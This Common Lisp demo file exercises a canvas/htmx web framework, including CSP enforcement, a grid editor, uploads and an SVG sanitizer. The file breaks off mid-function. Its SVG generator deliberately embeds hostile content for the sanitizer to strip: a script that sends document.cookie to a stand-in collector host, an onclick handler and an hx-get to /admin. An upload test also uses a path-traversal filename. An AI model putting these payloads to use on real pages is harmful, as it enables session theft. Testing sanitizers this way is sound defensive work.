(in-package #:harness-demos-canvas)

;;; The canvas demo (H4h). A canvas is a plain function in this image: keyword
;;; strings in, a canvas-protocol tree out. Nothing is written to disk except the
;;; frozen dashboard.html and diagram.html.
;;;
;;; Sections 5-7 cover canvas-protocol 0.2.0: key bindings without eval
;;; (KEY-CHORD, :keys, canvas-keys.js), :sync and HX-SWAP-OOB; engine-generated
;;; SVG through SVG-FRAGMENT's allowlist; file uploads (FILE-INPUT, multipart
;;; forms, COERCE-PARAM :file).

;;; ---- Image state -----------------------------------------------------------

(defparameter *tests*                   ; assertions per system, this session's runs
  '((:system "policy-protocol" :tests 445) (:system "rpc-backend-htmx" :tests 258)
    (:system "canvas-backend-svg" :tests 495) (:system "compute-backend-unkernel" :tests 394)
    (:system "agent-eval" :tests 487)))

(defparameter *timings*                 ; harness/unkernel section 6, ms: (guest . host)
  '(("generic loop" 2052 . 262) ("fixnum loop" 163 . 47) ("cons/sort/GC" 5471 . 591)))

;;; engels as the canvas theme, plus the --chart-1..8 series rules. canvas-protocol
;;; 0.1.1 has only :placeholder (the :engels method is the H4h-0b minor).
(defmethod canvas:theme-stylesheet ((theme (eql :engels)))
  (stack-encoding:encode (concatenate 'string (engels:css :minify t) (string #\Newline)
                                             (canvas:chart-css))
                                :encoding :utf-8))

;;; ---- Canvases: plain functions ---------------------------------------------

(defun test-table (&key sort)
  (canvas:table *tests*
                (list (canvas:column "System" :system :name "system" :sortable t)
                      (canvas:column "Assertions" :tests :name "tests" :sortable t :align :end))
                :id "tests" :link (canvas:canvas-link 'test-table) :sort sort
                :caption "Assertions per system (click a header to sort)"))

(defun test-chart (&key min)
  "Bar chart of the systems with at least MIN assertions."
  (multiple-value-bind (form errors)
      (canvas:coerce-form (list :min min) '((:min :integer :default 0 :min 0)))
    (let ((rows (remove-if (lambda (r) (< (getf r :tests) (getf form :min))) *tests*)))
      (canvas:el :div '(:id "chart")
                 (mapcar #'canvas:error-fragment errors)
                 (if rows
                     (canvas:make-chart :bar :title (format nil "Assertions (≥ ~d)" (getf form :min))
                       :series (list (canvas:make-series "assertions"
                                       (loop for r in rows collect (cons (getf r :system) (getf r :tests))))))
                     (canvas:el :p nil "No system has that many assertions."))))))

(defun threshold-form (&key (min "0"))
  "Posts to TEST-CHART; the response replaces only #chart."
  (canvas:form (list (canvas:number-input "min" :label "Minimum assertions" :value min :min 0)
                     (canvas:submit-button "Filter"))
               :link (canvas:canvas-link 'test-chart) :target "#chart" :swap :outer-html))

(defun timing-chart (&key)
  (canvas:make-chart :line :title "unkernel: SBCL workloads, guest vs host"
    :x-axis (canvas:make-axis :label "workload" :ticks '(1 2 3))
    :y-axis (canvas:make-axis :label "ms" :scale :log)
    :series (list (canvas:make-series "guest (wasm)" (loop for (nil g) in *timings* for i from 1 collect (cons i g)))
                  (canvas:make-series "host" (loop for (nil nil . h) in *timings* for i from 1 collect (cons i h))))))

(defun ticker (stream &key (n "3"))
  "SSE canvas: one <p> per event \"row\"."
  (dotimes (i (canvas:coerce-param n :integer :default 3 :min 1 :max 10))
    (rpc:rpc-send stream (canvas:fragment-event "row" (canvas:el :p nil (format nil "tick ~d: ~a ok" (1+ i) (getf (nth (mod i (length *tests*)) *tests*) :system)))))
    (sleep 0.1)))

(defun dashboard (&key)              ; &key: handlers are called with :allow-other-keys t
  (canvas:el :main nil (canvas:stack
   (list (canvas:el :h1 nil "Canvas demo: this session's test runs")
         (canvas:grid (list (canvas:card (test-table) :title "Test counts")
                            (canvas:card (list (threshold-form) (test-chart)) :title "Filter"))
                      :columns 2)
         (canvas:card (timing-chart) :title "Timings")
         (canvas:card (canvas:live-region (canvas:canvas-link 'ticker :n "3") "row" :id "ticks" :swap :before-end
                                         :content (canvas:el :p nil "Ticks stream in here over SSE (the frozen file has none)."))
                      :title "Live (SSE)")))))

;;; ---- 0.2.0: a keyboard-driven grid editor -----------------------------------
;;; The cells and the selection live in the image. The editor <section> carries
;;; the bindings (data-canvas-keys, acted on by the same-origin canvas-keys.js),
;;; hx-sync queues key presses in order, and one response updates three panels:
;;; the grid (the hx-target), the status bar and the key log (both out of band).
;;; The section itself is never swapped, so its queue survives every response.

(defparameter +grid-size+ 4)
(defparameter +grid-moves+ '(("ArrowUp" -1 . 0) ("ArrowDown" 1 . 0) ("ArrowLeft" 0 . -1) ("ArrowRight" 0 . 1)))
(defparameter +grid-keys+
  (append (mapcar #'car +grid-moves+) '("Backspace")
          (loop for code from (char-code #\a) to (char-code #\z) collect (string (code-char code))))
  "The chords the editor binds, spelled as KEY-CHORD prints them.")
(defvar *cells*)
(defvar *cursor*)                       ; (row column), 0-based

(defun reset-grid ()
  (setf *cells* (make-array (list +grid-size+ +grid-size+) :initial-element nil)
        *cursor* (list 0 0)))

(defun apply-key (key)
  "An arrow moves the selection (clamped), Backspace clears the cell, a letter sets it."
  (destructuring-bind (row col) *cursor*
    (let ((move (cdr (assoc key +grid-moves+ :test #'string=))))
      (cond (move (setf *cursor* (list (max 0 (min (1- +grid-size+) (+ row (car move))))
                                       (max 0 (min (1- +grid-size+) (+ col (cdr move)))))))
            ((string= key "Backspace") (setf (aref *cells* row col) nil))
            (t (setf (aref *cells* row col) (string-upcase key)))))))

(defun grid-panel ()
  (canvas:el :table '(:id "grid" :role "grid" :aria-label "4 by 4 cells")
    (canvas:el :tbody nil
      (loop for r below +grid-size+
            collect (canvas:el :tr nil
                      (loop for c below +grid-size+
                            for selected = (equal *cursor* (list r c))
                            for v = (or (aref *cells* r c) "·")
                            collect (canvas:el :td (when selected '(:aria-selected "true"))
                                      (if selected (canvas:el :mark nil v) v))))))))

(defun status-bar (&key key oob)
  (destructuring-bind (row col) *cursor*
    (canvas:el :p (append '(:id "status" :role "status") (when oob (canvas:hx-swap-oob)))
      (format nil "Row ~d, column ~d · ~d of ~d cells set~@[ · last key ~a~]" (1+ row) (1+ col)
              (count-if-not #'null (make-array (array-total-size *cells*) :displaced-to *cells*))
              (array-total-size *cells*) key))))

(defun grid-editor (&key)
  "The editor. Each bound chord posts to GRID-KEY with the parameter key=<chord>."
  (canvas:el :section (append '(:id "editor" :aria-label "Grid editor")
                              (canvas:hx-post (canvas:canvas-link 'grid-key) :target "#grid" :swap :outer-html
                                              :keys +grid-keys+ :sync :queue-all))
    (grid-panel)
    (status-bar)
    (canvas:el :ol '(:id "log" :aria-label "Key log"))))

(defun grid-key (&key key)
  "One key press: the new grid for #grid, then the status bar and a log line out of band."
  (let ((key (canvas:coerce-param key :choice :field "key" :choices +grid-keys+ :required t)))
    (apply-key key)
    (list (grid-panel)
          (status-bar :key key :oob t)
          (canvas:el :ol (canvas:hx-swap-oob :swap :before-end :target "#log")
            (canvas:el :li nil (format nil "~a → row ~d, column ~d" key
                                       (1+ (first *cursor*)) (1+ (second *cursor*))))))))

;;; ---- 0.2.0: engine-generated SVG --------------------------------------------
;;; ENGINE-SVG stands in for a third-party renderer (a layout engine): SVG text
;;; with defs, symbols, <use>, groups with ids and transforms, a <style> block,
;;; and the kinds of content no page should run.

(defun engine-svg (&key (stages '("parse" "plan" "emit")))
  (let ((width (+ 40 (* 120 (length stages)))))
    (with-output-to-string (s)
      (format s "<?xml version=\"1.0\" encoding=\"UTF-8\"?>~%<!-- generated by a layout engine -->~%")
      (format s "<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.1\" width=\"~d\" height=\"100\" viewBox=\"0 0 ~:*~d 100\" preserveAspectRatio=\"xMidYMid meet\">~%" width)
      (format s "  <title>Pipeline</title>~%  <style>.stage text { font: 14px sans-serif }</style>~%  <metadata>layout engine output</metadata>~%")
      (format s "  <defs>~%    <linearGradient id=\"stage-fill\" x1=\"0\" y1=\"0\" x2=\"0\" y2=\"1\" gradientUnits=\"objectBoundingBox\"><stop offset=\"0\" stop-color=\"#ffffff\"/><stop offset=\"1\" stop-color=\"#d9d9d9\"/></linearGradient>~%")
      (format s "    <marker id=\"arrow\" viewBox=\"0 0 10 10\" refX=\"9\" refY=\"5\" markerWidth=\"6\" markerHeight=\"6\" orient=\"auto\"><path d=\"M0,0 L10,5 L0,10 z\" fill=\"currentColor\"/></marker>~%")
      (format s "    <symbol id=\"stage-box\" viewBox=\"0 0 80 40\"><rect width=\"80\" height=\"40\" rx=\"6\" fill=\"url(#stage-fill)\" stroke=\"currentColor\"/></symbol>~%  </defs>~%")
      (format s "  <g id=\"stages\" class=\"stage\" transform=\"translate(20,30)\">~%")
      (loop for name in stages for i from 0
            do (format s "    <g id=\"stage-~d\" transform=\"translate(~d,0)\"~:[~; onclick=\"steal()\"~]><use ~:[href~;xlink:href~]=\"#stage-box\" width=\"80\" height=\"40\"/><text x=\"40\" y=\"25\" text-anchor=\"middle\" fill=\"currentColor\">~a</text></g>~%"
                       (1+ i) (* 120 i) (= i 1) (= i 2) name))
      (format s "  </g>~%  <g id=\"edges\" fill=\"none\" stroke=\"currentColor\">~%")
      (loop for i from 1 below (length stages)
            do (format s "    <path d=\"M~d,50 H~d\" marker-end=\"url(#arrow)\"/>~%" (- (* 120 i) 20) (+ (* 120 i) 18)))
      (format s "  </g>~%  <script>fetch('https://collector.example/?c=' + document.cookie)</script>~%")
      (format s "  <foreignObject x=\"0\" y=\"0\" width=\"10\" height=\"10\"><div xmlns=\"http://www.w3.org/1999/xhtml\">hi</div></foreignObject>~%")
      (format s "  <use href=\"https://cdn.example/sprites.svg#logo\" x=\"~d\" y=\"0\"/>~%" (- width 30))
      (format s "  <rect id=\"badge\" x=\"~d\" y=\"80\" width=\"20\" height=\"10\" fill=\"url(https://cdn.example/paint.svg#p)\" hx-get=\"/admin\"/>~%</svg>~%" (- width 30)))))

(defun engine-violations ()
  "What SVG-FRAGMENT refuses in the engine's output (NIL when nothing)."
  (handler-case (progn (canvas:svg-fragment (engine-svg)) nil)
    (canvas:unsafe-svg (c) (canvas:csp-error-violations c))))

(defun safe-diagram ()
  "The engine's SVG through the allowlist, the offending parts stripped, sized by viewBox only."
  (handler-bind ((canvas:unsafe-svg (lambda (c) (declare (ignore c)) (invoke-restart 'canvas:strip-violations))))
    (canvas:svg-fragment (engine-svg) :attrs '(:width nil :height nil :role "img" :aria-label "Pipeline: parse, plan, emit"))))

(defun diagram (&key)
  (canvas:el :main nil
    (canvas:stack
     (list (canvas:el :h1 nil "Engine SVG, embedded")
           (canvas:card (safe-diagram) :title "Pipeline (from the layout engine)")
           (canvas:card (canvas:el :ul nil
                          (loop for v in (engine-violations)
                                collect (canvas:el :li nil (canvas:el :code nil (format nil "~(~a~)" (getf v :kind)))
                                                   (format nil " on <~a>~@[ ~a~]" (getf v :element) (getf v :attribute)))))
                        :title "Stripped by svg-fragment")))))

;;; ---- 0.2.0: file uploads -----------------------------------------------------

(defparameter +image-accept+ "image/png,.svg")
(defparameter +max-image-bytes+ 2048)

(defun %upload-form (error)
  (canvas:form (list (canvas:file-input "images" :label "Images (PNG or SVG, at most 2 KiB each)"
                                                 :accept +image-accept+ :multiple t :required t :error error)
                     (canvas:submit-button "Upload"))
               :id "upload" :link (canvas:canvas-link 'upload-images)))

(defun upload-form (&key) (%upload-form nil))

(defun upload-images (&key images)
  "The form's handler: the parts through COERCE-PARAM :file; an error renders next to the input."
  (multiple-value-bind (form errors)
      (canvas:coerce-form (list :images images)
                          `((:images :file :max-size ,+max-image-bytes+ :accept ,+image-accept+ :multiple t :required t)))
    (if errors
        (%upload-form (canvas:find-field-error errors "images"))
        (canvas:el :ul '(:id "upload")
          (loop for f in (getf form :images)
                collect (canvas:el :li nil (format nil "~a: ~a, ~d bytes" (canvas:uploaded-file-filename f)
                                                   (canvas:uploaded-file-media-type f) (canvas:uploaded-file-size f))))))))

;;; ---- Server: allowlist, token, CSP ------------------------------------------

(defparameter +csp+ "default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data:; connect-src 'self'; frame-ancestors 'none'")
(defparameter *handlers*
  (rh:make-htmx-handlers 'dashboard 'test-table 'test-chart 'threshold-form '(ticker :mode :call-stream)
                         'grid-editor 'grid-key 'diagram 'upload-form 'upload-images))
(defvar *transport* (rhc:make-canvas-htmx-transport :page-title "canvas demo"))

(defun with-csp (response)              ; a (status headers body) list or a streaming function
  (flet ((add (r) (list* (first r) (list* :content-security-policy +csp+ (second r)) (cddr r))))
    (if (functionp response)
        (lambda (responder) (funcall response (lambda (r) (funcall responder (add r)))))
        (add response))))

(defun guarded-app (token)
  "The canvas app behind a one-time ?token= URL that sets an HttpOnly cookie, and the CSP."
  (let ((app (rh:htmx-app *transport* *handlers*)) (url-token token))
    (lambda (env)
      (let* ((headers (getf env :headers))
             (cookie (or (gethash "cookie" headers) ""))
             (query (quri:url-decode-params (or (getf env :query-string) ""))))
        (with-csp
            (cond ((search (format nil "canvas-token=~a" token) cookie) (funcall app env))
                  ((and url-token (equal url-token (cdr (assoc "token" query :test #'string=))))
                   (setf url-token nil)        ; one-time
                   (list 303 (list :location (getf env :path-info)
                                   :set-cookie (format nil "canvas-token=~a; HttpOnly; SameSite=Strict; Path=/" token))
                         '("")))
                  (t (list 403 '(:content-type "text/plain") '("forbidden: no canvas token")))))))))

;;; ---- Driving it -------------------------------------------------------------

(defun banner (title) (format t "~&~%~72,,,'=a~%== ~a~%~72,,,'=a~%" "" title ""))
(defun clip (s &optional (n 700)) (if (> (length s) n) (format nil "~a … [~d chars]" (subseq s 0 n) (length s)) s))
(defun redact (s token)
  (let* ((s (format nil "~{~a~^, ~}" (if (listp s) s (list s)))) (i (search token s)))
    (if i (concatenate (quote string) (subseq s 0 i) "<token>" (subseq s (+ i (length token)))) s)))
(defun text (body) (if (stringp body) body (stack-encoding:decode-octets body :encoding :utf-8)))
(defun url (port name &optional (query "")) (format nil "http://127.0.0.1:~d/canvas/~a~a" port (rh:htmx-method-name name) query))

(defun get* (url &rest headers)
  (let ((r (http:request :get url :headers headers :timeout 10 :max-redirects 0)))
    (values (hp:response-status r) (text (hp:response-body r)) r)))

(defun demo-in-process (token)
  (banner "1. In-process htmx client (no socket): fragments, the form, SSE, the allowlist")
  (let ((c (rh:make-htmx-client (guarded-app token) :codec (rh:htmx-transport-codec *transport*)))
        (cookie (format nil "canvas-token=~a" token)))
    (flet ((call (name params &rest keys)
             (let ((r (apply #'rh:htmx-request c (rh:htmx-method-name name) params :headers `(("cookie" . ,cookie)) keys)))
               (format t "~&~a ~s → ~d~%  ~a~%" name params (rh:htmx-reply-status r) (clip (text (rh:htmx-reply-body r)) 500))
               r)))
      (call 'test-table '(:sort "-tests"))
      (call 'threshold-form '(:min "400"))
      (call 'test-chart '(:min "400") :http-method :post)
      (call 'test-chart '(:min "lots") :http-method :post)
      (format t "~&ticker (Accept: text/event-stream) → events ~s~%"
              (rh:htmx-reply-events (call 'ticker '(:n "3") :accept "text/event-stream")))
      (format t "~&not in the allowlist: CL-USER::SECRET → ~d~%"
              (rh:htmx-reply-status (rh:htmx-request c "COMMON-LISP-USER::SECRET" nil :headers `(("cookie" . ,cookie))))))))

(defun demo-http (port token)
  (banner "2. Real HTTP (http-backend-async on libuv) against Hunchentoot on 127.0.0.1")
  (format t "no token        → ~d~%" (get* (url port 'dashboard)))
  (multiple-value-bind (status body r) (get* (url port 'dashboard (format nil "?token=~a" token)))
    (declare (ignore body))
    (format t "one-time URL    → ~d, Location ~a~%                  Set-Cookie ~a~%" status
            (hp:response-header r "location") (redact (hp:response-header r "set-cookie") token)))
  (let ((hp:*http-client* (hp:make-http-client hp:*http-backend*))) ; a client without the cookie
    (format t "same URL again, another client → ~d (the URL token is spent)~%"
            (get* (url port 'dashboard (format nil "?token=~a" token)))))
  (multiple-value-bind (status body r) (get* (url port 'dashboard))
    (format t "~&GET dashboard (no HX-Request: full page) → ~d ~a~%Content-Security-Policy: ~a~%~a~%"
            status (hp:response-header r "content-type") (hp:response-header r "content-security-policy") (clip body 900))
    (let ((i (search "<div id=\"ticks\"" body))) (format t "~&the live region in that page: ~a~%" (subseq body i (+ 6 (search "</div>" body :start2 i)))))
    (format t "~&csp-violations of the served dashboard tree: ~s~%" (let ((canvas:*canvas-resolver* (rhc:make-htmx-resolver *transport* *handlers*))) (canvas:csp-violations (dashboard)))))
  (let ((r (http:request :post (url port 'test-chart) :form-data '(("min" . "450")) :headers '(("hx-request" . "true")) :timeout 10)))
    (format t "~&form submit: POST min=450 to TEST-CHART (HX-Request) → ~d~%  ~a~%" (hp:response-status r) (clip (text (hp:response-body r)) 400)))
  (multiple-value-bind (status body) (get* (url port 'ticker) '("accept" . "text/event-stream"))
    (format t "~&SSE ticker → ~d~%~a" status body))
  (format t "~&asset htmx.min.js → ~d (served from 'self', htmx ~a)~%" (get* (format nil "http://127.0.0.1:~d/canvas-assets/htmx.min.js" port)) canvas:+htmx-version+))

(defun demo-redefine (port)
  (banner "4. Redefine the chart canvas live: no restart, the next request shows it")
  (let ((before (nth-value 1 (get* (url port 'test-chart) '("hx-request" . "true"))))
        (form '(defun test-chart (&key min)
                (declare (ignore min))
                (canvas:el :div '(:id "chart")
                  (canvas:make-chart :scatter :title "Assertions (redefined: scatter, vermillion)"
                    :series (list (canvas:make-series "assertions" (loop for r in *tests* for i from 1 collect (cons i (getf r :tests)))
                                                      :color "#D55E00")))))))
    (let ((*package* (find-package :harness-demos-canvas))) (let ((*print-case* :downcase)) (format t "~s~%" form)) (eval form))
    (let ((after (nth-value 1 (get* (url port 'test-chart) '("hx-request" . "true")))))
      (format t "before: ~a~%after:  ~a~%" (subseq before 0 60) (subseq after 0 60))
      (format t "bar before: ~s, scatter after: ~s, color=\"#D55E00\" after: ~s~%"
              (and (search "data-chart=\"bar\"" before) t) (and (search "data-chart=\"scatter\"" after) t) (and (search "color=\"#D55E00\"" after) t)))))

(defun demo-freeze (dir)
  (banner "3. freeze: the dashboard as one self-contained static file")
  (let* ((html (canvas:freeze 'dashboard :title "Canvas demo"))
         (path (merge-pathnames "dashboard.html" dir)))
    (with-open-file (o path :direction :output :if-exists :supersede :external-format :utf-8) (write-string html o))
    (format t "wrote dashboard.html: ~d chars, deterministic: ~s~%" (length html) (string= html (canvas:freeze 'dashboard :title "Canvas demo")))
    (dolist (needle '("http:" "https:" "//" "url(" "@import" "<script" "<link" "hx-" "sse-"))
      (format t "  ~10a ~d occurrence~:p~%" needle (loop for i = (search needle html) then (search needle html :start2 (1+ i)) while i count t)))
    path))

;;; ---- Driving the 0.2.0 sections ---------------------------------------------

(defvar *checks* '() "(name . boolean), newest first: the 0.2.0 self-check.")
(defun check (name value) (push (cons name (and value t)) *checks*) value)

(defun app-resolved (fn)
  "FN called under the server's resolver, so links and assets render as the app serves them."
  (let ((canvas:*canvas-resolver* (rhc:make-htmx-resolver *transport* *handlers*))) (funcall fn)))

(defun count-of (needle s) (loop for i = (search needle s) then (search needle s :start2 (1+ i)) while i count t))
(defun lines-after (s &rest closers)
  "S with a newline after each CLOSER, for printing a response of several panels."
  (with-output-to-string (o)
    (loop with i = 0
          for hit = (let ((ends (loop for c in closers for j = (search c s :start2 i) when j collect (+ j (length c)))))
                      (and ends (reduce #'min ends)))
          while hit do (format o "  ~a~%" (subseq s i hit)) (setf i hit)
          finally (when (< i (length s)) (format o "  ~a~%" (subseq s i))))))

(defun demo-keys (token)
  (banner "5. A keyboard-driven grid editor: key chords, hx-sync, hx-swap-oob (0.2.0)")
  (reset-grid)
  (format t "key-chord spells a binding the way canvas-keys.js reports the key press:~%")
  (dolist (s '("arrowup" "ctrl+Z" "Shift+a" "control+alt+delete" "space" "Plus"))
    (format t "  ~22s → ~s~%" s (canvas:key-chord s)))
  (dolist (s '("Shift+/" "Ctrl++" "Hyper+x"))
    (format t "  ~22s → refused: ~a~%" s (handler-case (canvas:key-chord s) (canvas:canvas-error (c) c))))
  (let* ((cookie `(("cookie" . ,(format nil "canvas-token=~a" token))))
         (c (rh:make-htmx-client (guarded-app token) :codec (rh:htmx-transport-codec *transport*)))
         (editor (app-resolved (lambda () (canvas:to-html (grid-editor))))))
    (format t "~&~%the editor as served: the <section> holds the bindings, the queue and the target~%  ~a~%" editor)
    (check :keys-bound (search "data-canvas-keys=\"ArrowUp ArrowDown ArrowLeft ArrowRight Backspace a b" editor))
    (check :queue-all (search "hx-sync=\"this:queue all\"" editor))
    (let ((v (app-resolved (lambda () (canvas:csp-violations (grid-editor))))))
      (format t "csp-violations of the editor tree: ~s~%" v)
      (check :editor-csp-clean (null v)))
    (let ((head (app-resolved (lambda () (canvas:to-html (canvas:page (grid-editor) :title "grid editor" :keys t))))))
      (format t "(page body :keys t) loads canvas-keys.js after htmx and the SSE extension:~%")
      (loop for i = (search "<script" head) then (search "<script" head :start2 (1+ i)) while i
            do (format t "  ~a~%" (subseq head i (+ 9 (search "</script>" head :start2 i)))))
      (check :keys-script (search "canvas-keys.js" head)))
    (let ((r (rh:htmx-request-url c (app-resolved (lambda () (canvas:resolve-asset-url canvas:*canvas-resolver* "canvas-keys.js")))
                                  :hx-request nil :headers cookie)))
      (format t "GET the asset canvas-keys.js → ~d ~a, ~d bytes, from 'self'~%" (rh:htmx-reply-status r)
              (rh:htmx-reply-header r "content-type") (length (rh:htmx-reply-body r))))
    (let ((page (text (rh:htmx-reply-body (rh:htmx-request c (rh:htmx-method-name 'grid-editor) nil :hx-request nil :headers cookie)))))
      (format t "GET grid-editor as a full page (rpc-backend-htmx's page): canvas-keys.js in it: ~s (no :keys option yet, rpc-backend-htmx#6)~%" (and (search "canvas-keys.js" page) t)))
    (format t "~&~%three key presses, as htmx sends them after canvas-keys.js fires canvas:key on #editor:~%")
    (dolist (key '("ArrowRight" "ArrowDown" "k"))
      (let ((r (rh:htmx-request c (rh:htmx-method-name 'grid-key) (list :key key) :http-method :post
                                :target "grid" :trigger "editor" :headers cookie)))
        (format t "~&POST GRID-KEY key=~a (HX-Request: true, HX-Trigger: editor, HX-Target: grid) → ~d~%~a"
                key (rh:htmx-reply-status r) (lines-after (text (rh:htmx-reply-body r)) "</table>" "</p>"))
        (check :oob-panels (and (search "<p id=\"status\" role=\"status\" hx-swap-oob=\"true\">" (text (rh:htmx-reply-body r)))
                                (search "<ol hx-swap-oob=\"beforeend:#log\">" (text (rh:htmx-reply-body r)))))))
    (check :cell-set (equal (aref *cells* 1 1) "K"))
    (let ((r (rh:htmx-request c (rh:htmx-method-name 'grid-key) '(:key "F5") :http-method :post :headers cookie)))
      (format t "~&an unbound chord sent by hand: POST GRID-KEY key=F5 → ~d~%  ~a~%" (rh:htmx-reply-status r) (text (rh:htmx-reply-body r)))
      (check :unbound-422 (= 422 (rh:htmx-reply-status r)))))
  (format t "~&~%a [filter] trigger is refused:~%")
  (let ((c (handler-case (app-resolved (lambda () (canvas:hx-post (canvas:canvas-link 'grid-key) :trigger "keydown[key=='ArrowUp'] from:body")))
             (canvas:canvas-csp-error (c) c))))
    (format t "  (hx-post … :trigger \"keydown[key=='ArrowUp'] from:body\") → ~a~%    ~a~%    violations ~s~%"
            (type-of c) c (and (typep c 'canvas:canvas-csp-error) (canvas:csp-error-violations c)))
    (check :filter-refused (typep c 'canvas:canvas-csp-error)))
  (format t "  csp-violations of a raw <div hx-trigger=\"keydown[key=='ArrowUp']\">: ~s~%"
          (canvas:csp-violations (stack-html:make-html-element "div" :attributes '(("hx-trigger" . "keydown[key=='ArrowUp']")))))
  (let* ((page (app-resolved (lambda () (canvas:to-html (canvas:page (grid-editor) :keys t)))))
         (i (search "<meta name=\"htmx-config\"" page)))
    (format t "  why: htmx runs an event filter as JavaScript (the Function constructor), which needs 'unsafe-eval'.~%  The CSP has none: ~a~%  and every canvas page sets allowEval false, under which htmx 2.0.11 lets a filter match every event:~%    ~a~%  canvas-keys.js matches chords from 'self' and evaluates nothing.~%"
            +csp+ (subseq page i (1+ (search ">" page :start2 i))))))

(defun demo-svg (dir)
  (banner "6. Engine-generated SVG through svg-fragment's allowlist (0.2.0)")
  (let ((source (engine-svg)))
    (format t "the engine's output (~d chars):~%~a" (length source) source)
    (let* ((tree (handler-bind ((canvas:unsafe-svg
                                  (lambda (c)
                                    (format t "~&svg-fragment signals ~a (a ~a) with ~d violations, in document order:~%"
                                            (type-of c) 'canvas:canvas-csp-error (length (canvas:csp-error-violations c)))
                                    (dolist (v (canvas:csp-error-violations c)) (format t "  ~s~%" v))
                                    (check :unsafe-svg (= 6 (length (canvas:csp-error-violations c))))
                                    (format t "restart ~s offered: ~s → invoked~%" 'canvas:strip-violations
                                            (and (find-restart 'canvas:strip-violations c) t))
                                    (invoke-restart 'canvas:strip-violations))))
                   (canvas:svg-fragment source)))
           (html (canvas:to-html tree)))
      (format t "~&~%the cleaned tree (to-html, ~d chars):~%~a~%" (length html) html)
      (format t "~&kept:~%")
      (dolist (needle '("id=\"stage-fill\"" "id=\"arrow\"" "id=\"stage-box\"" "id=\"stages\"" "id=\"stage-2\"" "id=\"badge\""
                        "viewBox=" "preserveAspectRatio=" "<linearGradient" "gradientUnits=" "refX=" "markerWidth="
                        "<use href=\"#stage-box\"" "fill=\"url(#stage-fill)\"" "transform=\"translate(120,0)\""))
        (format t "  ~30a ~d~%" needle (count-of needle html)))
      (format t "gone:~%")
      (dolist (needle '("<style" "<metadata" "<script" "<foreignObject" "onclick" "hx-get" "https:" "xlink" "version=" "<!--"))
        (format t "  ~30a ~d~%" needle (count-of needle html)))
      (check :ids-camel-kept (and (search "id=\"stage-box\"" html) (search "viewBox=" html) (search "markerWidth=" html)
                                  (= 3 (count-of "<use href=\"#stage-box\"" html))))
      (check :stripped (every (lambda (n) (zerop (count-of n html))) '("<style" "<script" "<foreignObject" "onclick" "hx-get" "https:")))
      (format t "csp-violations of the cleaned tree: ~s; neutralize leaves it unchanged: ~s; svg-fragment of its own output gives the same text: ~s~%"
              (canvas:csp-violations tree) (string= html (canvas:to-html (canvas:neutralize tree)))
              (check :round-trip (string= html (canvas:to-html (canvas:svg-fragment html)))))))
  (let ((doc (app-resolved (lambda () (canvas:page (diagram) :title "Engine SVG")))))
    (let ((v (canvas:csp-violations doc)))
      (format t "csp-violations of the final page (page + the stripped diagram): ~s~%" v)
      (check :page-csp-clean (null v))))
  (let* ((html (canvas:freeze 'diagram :title "Engine SVG"))
         (path (merge-pathnames "diagram.html" dir)))
    (with-open-file (o path :direction :output :if-exists :supersede :external-format :utf-8) (write-string html o))
    (format t "~&freeze 'diagram → wrote diagram.html: ~d chars, deterministic: ~s~%" (length html)
            (check :freeze-deterministic (string= html (canvas:freeze 'diagram :title "Engine SVG"))))
    (dolist (needle '("<script" " onclick=" "<foreignObject" "https:" "http:" "hx-get=" "url(#" "viewBox=" "<style"))
      (format t "  ~14a ~d~%" needle (count-of needle html)))
    (format t "  (the one <style> is the page stylesheet in <head>)~%")))

(defparameter +png+ (stack-encoding:decode "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==" :encoding :base64)
  "A 1x1 PNG.")
(defparameter +gif+ (stack-encoding:decode "R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" :encoding :base64)
  "A 1x1 GIF.")

(defun browser-body (boundary parts &key header-block)
  "multipart/form-data octets shaped as a browser sends them. HEADER-BLOCK prepends the
Content-Type header naming the boundary (the shape rpc-backend-htmx's codec hands
STACK-MIME:PARSE-MIME). PARTS: (name filename content-type octets)."
  (let ((crlf (format nil "~c~c" #\Return #\Linefeed)))
    (flet ((octets (s) (stack-encoding:encode s :encoding :utf-8)))
      (apply #'concatenate '(vector (unsigned-byte 8))
             (if header-block (octets (format nil "Content-Type: multipart/form-data; boundary=~a~a~a" boundary crlf crlf)) #())
             (append (loop for (name filename type content) in parts
                           collect (octets (format nil "--~a~aContent-Disposition: form-data; name=\"~a\"; filename=\"~a\"~aContent-Type: ~a~a~a"
                                                   boundary crlf name filename crlf type crlf crlf))
                           collect content
                           collect (octets crlf))
                     (list (octets (format nil "--~a--~a" boundary crlf))))))))

(defun report-coercion (c)
  (format t "  signals ~a: ~a~%    expected ~s, detail ~s~@[, size ~d~]~%    restarts: ~{~(~a~)~^ ~}~%"
          (type-of c) c (canvas:coercion-error-expected c) (canvas:coercion-error-detail c)
          (and (typep c 'canvas:canvas-upload-too-large) (canvas:upload-error-size c))
          (remove-if-not (lambda (n) (member n '(use-value canvas:use-default)))
                         (mapcar #'restart-name (compute-restarts c)))))

(defparameter +upload-boundary+ "----formdata-demo-7")
(defparameter +upload-files+
  (list (list "images" "../../chart.png" "image/png" +png+)
        (list "images" "photos/holiday.png" "image/png"
              (concatenate '(vector (unsigned-byte 8)) +png+ (make-array 6000 :initial-element 0)))
        (list "images" "spinner.gif" "image/gif" +gif+))
  "Three files under one name, as <input type=file multiple> sends them.")

(defun browser-post-env (path-info body content-type cookie)
  "A Clack env shaped as a browser's htmx POST of BODY (the shape the htmx client builds)."
  (let ((headers (make-hash-table :test 'equal)))
    (setf (gethash "hx-request" headers) "true" (gethash "cookie" headers) cookie
          (gethash "content-type" headers) content-type
          (gethash "content-length" headers) (princ-to-string (length body)))
    (list :request-method :post :script-name "" :path-info path-info :request-uri path-info :query-string nil
          :server-name "localhost" :server-port 80 :server-protocol :http/1.1 :url-scheme "http"
          :remote-addr "127.0.0.1" :headers headers
          :content-type content-type :content-length (length body) :raw-body (hp:make-octet-input-stream body))))

(defun demo-upload (token)
  (banner "7. Uploads: file-input, a multipart form, coerce-param :file (0.2.0)")
  (let ((html (app-resolved (lambda () (canvas:to-html (upload-form))))))
    (format t "the form (a file input inside → enctype=\"multipart/form-data\", which htmx sends as FormData):~%  ~a~%" html)
    (check :multipart-enctype (search "enctype=\"multipart/form-data\"" html)))
  (let* ((parts (stack-mime:mime-parts
